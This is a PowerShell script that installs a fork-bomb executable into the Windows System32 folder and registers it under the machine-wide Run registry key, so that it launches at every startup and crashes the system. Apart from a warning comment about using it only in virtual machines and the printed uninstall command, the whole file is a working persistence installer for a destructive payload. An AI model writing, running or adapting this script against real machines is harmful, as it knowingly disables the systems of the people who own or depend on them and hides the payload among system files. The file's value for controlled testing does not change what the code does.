# Requires -RunAsAdministrator

# Fork Bomb BSOD Startup Installation Script for Windows 11
# WARNING: This will crash your system immediately after startup!
# Only use in virtual machines for testing purposes.

Write-Host "Fork Bomb BSOD Startup Installer" -ForegroundColor Cyan
Write-Host "=================================" -ForegroundColor Cyan
Write-Host ""

# Check if running as administrator
$isAdmin = [bool]([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -match "S-1-5-32-544")
if (-not $isAdmin) {
  Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
  Write-Host "Please run PowerShell as Administrator and try again." -ForegroundColor Red
  exit 1
}

# Define paths
$sourceExe = "forkbomb_windows.exe"
$destPath = "C:\Windows\System32\forkbomb.exe"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$registryName = "Forkbomb"

# Check if source executable exists
if (-not (Test-Path $sourceExe)) {
  Write-Host "ERROR: $sourceExe not found in current directory!" -ForegroundColor Red
  Write-Host "Please ensure forkbomb_windows.exe is in the same directory as this script." -ForegroundColor Red
  exit 1
}

# Copy executable to System32
Write-Host "Copying $sourceExe to System32..." -ForegroundColor Yellow
try {
  Copy-Item -Path $sourceExe -Destination $destPath -Force
  Write-Host "Successfully copied to $destPath" -ForegroundColor Green
} catch {
  Write-Host "ERROR: Failed to copy executable: $_" -ForegroundColor Red
  exit 1
}

# Add registry entry for startup
Write-Host "Adding registry entry for startup..." -ForegroundColor Yellow
try {
  Set-ItemProperty -Path $registryPath -Name $registryName -Value $destPath -Force
  Write-Host "Successfully added registry entry" -ForegroundColor Green
} catch {
  Write-Host "ERROR: Failed to add registry entry: $_" -ForegroundColor Red
  exit 1
}

# Verify installation
Write-Host ""
Write-Host "Verifying installation..." -ForegroundColor Yellow
$registryValue = Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue
if ($registryValue.$registryName -eq $destPath) {
  Write-Host "Installation verified successfully!" -ForegroundColor Green
  Write-Host ""
  Write-Host "SUCCESS! Fork bomb has been registered for BSOD startup." -ForegroundColor Green
  Write-Host "The fork bomb will execute automatically after the next system restart." -ForegroundColor Cyan
  Write-Host ""
  Write-Host "⚠️  WARNING: The system will become unstable and crash shortly after startup!" -ForegroundColor Red
  Write-Host ""
  Write-Host "To uninstall, run:" -ForegroundColor Yellow
  Write-Host "Remove-ItemProperty -Path '$registryPath' -Name '$registryName' -Force" -ForegroundColor Gray
} else {
  Write-Host "ERROR: Installation could not be verified." -ForegroundColor Red
  exit 1
}
